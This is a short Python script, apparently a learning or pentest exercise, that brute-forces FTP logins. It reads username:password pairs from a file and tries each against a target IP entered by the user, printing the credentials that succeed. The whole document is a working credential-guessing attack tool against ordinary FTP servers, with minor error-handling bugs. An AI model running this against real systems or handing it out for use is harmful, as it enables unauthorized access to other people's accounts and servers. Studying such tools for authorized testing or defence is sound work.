#!/usr/bin/python

# using the ftp library for connecting
import ftplib

def bruteLogin(host, passwdFile):
    try:
        # open the specified file
        pF = open(passwdFile, "r")
    except:
        print("The user/password file doesn't exist")

    # read the file
    for line in pF.readlines():
        # split on the colon for the username and password
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("Trying: " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(host)
            # login in with the username and password
            login = ftp.login(userName, passWord)
            print("Login Succeeded with username: " + userName + " and password: " + passWord)
            # quit the ft[p session
            ftp.quit()
            # return with the
            return (userName, passWord)
        except:
            pass

    print("Password not in List")


def main():
    host = input("[*] Please enter target IP address: ")
    passwdFile = input("Please specify the user/password file: ")
    user, password  = bruteLogin(host, passwdFile)
    print("please use " + user + " and password " + password + " to ftp")


if __name__ =='__main__':
    main()


